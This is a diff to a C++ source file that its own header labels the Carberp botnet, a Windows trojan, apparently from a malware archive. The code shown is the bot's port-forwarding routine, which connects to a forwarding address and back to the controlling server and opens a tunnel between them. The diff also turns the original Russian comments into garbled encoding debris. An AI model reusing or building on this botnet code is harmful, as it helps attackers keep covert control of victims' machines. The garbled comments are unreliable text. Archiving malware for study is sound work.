@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 #include "../common/protocol.h"
 #include "ClientOps.h"
@@ -71,17 +82,17 @@ void ProcessPORTFORW( CClientContext *pContext, SOCKET s, PPacket p )
 		PORT_FORW* pf = (PORT_FORW*)p->data;
 		int portForw = pf->portForw ? pf->portForw : defaultPortForward;
 		int portConnect = pf->portConnect ? pf->portConnect : pContext->m_iPort;
-		SOCKET s1 = ConnectWithIP( IP_PORTFORW, portForw ); //коннектимся к пробрасываемому порту
+		SOCKET s1 = ConnectWithIP( IP_PORTFORW, portForw ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if( s1 != 0 )
 		{
-			SOCKET s2 = ConnectWithIP( pContext->m_sServer, portConnect ); //коннектимся снова к клиенту
+			SOCKET s2 = ConnectWithIP( pContext->m_sServer, portConnect ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if( s2 != 0 )
 			{
-				//сообщаем что соединились для проброса
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				//PacketBuffer pb;
 				//pb.Create( PK_CS_PORTFORW, p->timestamp, 0, 0 );
 				//pb.Send(s2);
-				//создаем туннель
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				TUNNEL_INFO* tunnelInfo = (TUNNEL_INFO*) malloc(sizeof(TUNNEL_INFO));
 				tunnelInfo->s1 = s1;
 				tunnelInfo->s2 = s2;
